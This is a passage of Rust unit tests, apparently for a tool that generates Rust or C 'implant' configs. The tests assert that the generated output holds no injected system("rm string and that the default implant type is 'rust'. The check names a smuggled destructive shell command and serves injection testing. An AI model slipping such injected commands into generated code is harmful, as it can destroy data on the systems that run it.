        assert!(!rust_config.contains(r#"system("rm"#));  // 确保没有未转义的嵌套引号
        
        let c_config = generate_c_config(&req);
        assert!(!c_config.contains(r#"system("rm"#));
    }

    #[test]
    fn test_default_implant_type() {
        assert_eq!(default_implant_type(), "rust");
    }
}
